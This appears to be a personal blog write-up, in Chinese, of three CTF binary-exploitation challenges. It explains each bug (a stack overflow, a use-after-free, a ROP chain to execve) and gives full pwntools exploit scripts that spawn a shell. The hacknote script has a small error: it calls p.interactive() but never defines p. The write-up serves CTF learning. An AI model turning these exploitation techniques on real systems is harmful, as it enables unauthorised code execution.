---
title: Writeup for First Week
mathjax: true
date: 2021-01-14 15:15:17
tags: pwn
---

## ciscn_2019_ne_5

傻了傻了，居然没想到用ROPgadget来找字符串，而只是在IDA Pro中看了而已。

system函数已经在Print函数中给出来了。只要有一个`/bin/sh`就够了。

但是这样也不准确，只需要`sh`就可以了。

以后找字符串的时候，直接用ROPgadget，不只能找gadget好吧。。。
```
➜  ciscn_2019_ne_5 ROPgadget --binary pwn --string 'sh'
Strings information
============================================================
0x080482ea : sh
```

```python
from pwn import *

p = remote('node3.buuoj.cn', 27077)
elf = ELF('./pwn')
system_plt = elf.plt['system']

payload = b'a' * 0x48 + b'b' * 0x4 + p32(system_plt) + p32(0xdeadbeef) + p32(0x080482ea)
p.sendlineafter('Please input admin password:', 'administrator')
p.sendlineafter('0.Exit\n:', '1')
p.sendlineafter('Please input new log info:', payload)
p.sendlineafter('0.Exit\n:', '4')

p.interactive()
```

## HITCON-training hacknote

UAF第一道题。

UAF即free掉之后却没有置0，这个残留指针可以再被利用。

```python

#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./pwn')


def add(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def delete(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


magic_addr = 0x08048986

add(32, "aaaa")
add(32, "ddaa")

delete(0)
delete(1)

add(8, p32(magic_addr))

show(0)

p.interactive()
```

## ciscn_2019_s_3

这道题挺好玩的，要好好记录一下。

IDA翻译成C出来根本没法读，只能看汇编（汇编更容易看

主程序在`vuln`函数里，先从`%rsp - 0x10`的地址开始读入至多0x400个字符，然后输出0x30个字符，显然栈溢出。

然后还有个`gadget`函数，很清楚地能看出`mov $0xf, %rax`和`mov $0x3b, %rax`这两个gadget，第一个是sigreturn的调用号，第二个就是execve的调用号。

然后针对这两个gadgets，分别有SROP和利用通用gadget做ROP这两种方法。

SROP在网上看到的似乎打不通，就只用普通ROP的做法。

由于需要控制rdx，需要辛苦点用上通用gadget。

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

from pwn import *

context.log_level = 'debug'
p = remote('node3.buuoj.cn', '28690')
# p = process('./pwn')
elf = ELF('./pwn')
main_addr = elf.symbols['main']

csu_end = 0x40059a
csu_front = 0x400580
syscall_ret = 0x400517
mov_rax_ret = 0x4004e2
pop_rdi = 0x4005a3

payload1 = b'A' * 0x10 + p64(main_addr)
p.sendline(payload1)
p.recv(0x20)
buf = p.recv()[:8]
leak_addr = u64(buf)
binsh_addr = leak_addr - 0x138
log.info(hex(binsh_addr))

payload = b'/bin/sh\x00' + b'A' * 0x8 + p64(mov_rax_ret)
payload += p64(csu_end) + p64(0) + p64(1) + p64(binsh_addr + 0x10) + p64(0) + p64(0) + p64(0)
payload += p64(csu_front) + p64(0) * 7
payload += p64(pop_rdi) + p64(binsh_addr)
payload += p64(syscall_ret)
p.sendline(payload)
p.interactive()
```
